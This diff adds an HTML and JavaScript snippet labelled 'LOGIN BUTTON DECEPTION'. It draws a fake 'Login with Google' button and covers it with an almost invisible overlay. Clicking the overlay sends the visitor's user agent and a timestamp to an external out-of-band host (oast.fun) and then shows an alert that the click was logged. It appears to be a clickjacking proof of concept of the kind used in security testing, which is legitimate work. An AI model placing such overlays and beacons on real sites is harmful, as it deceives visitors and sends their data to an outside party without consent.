@@ -1,0 +1,27 @@
+<!-- LOGIN BUTTON DECEPTION -->
+<div style="text-align:center; margin-top:80px;">
+  <button id="loginBtn" style="padding:15px 40px; font-size:18px; background:#4285f4; color:white; border:none; border-radius:8px;">
+    🔐 Login with Google
+  </button>
+</div>
+
+<script>
+  const overlay = document.createElement('div');
+  overlay.style.position = 'absolute';
+  overlay.style.top = '80px';
+  overlay.style.left = 'calc(50% - 100px)';
+  overlay.style.width = '200px';
+  overlay.style.height = '60px';
+  overlay.style.zIndex = '9999';
+  overlay.style.cursor = 'pointer';
+  overlay.style.background = 'rgba(255,255,255,0.01)'; // transparent
+  overlay.onclick = () => {
+    fetch('https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun/login-click', {
+      method: 'POST',
+      body: JSON.stringify({ ua: navigator.userAgent, timestamp: Date.now() }),
+      headers: { 'Content-Type': 'application/json' }
+    });
+    alert("🔍 Click logged. (Not actual login)");
+  };
+  document.body.appendChild(overlay);
+</script>
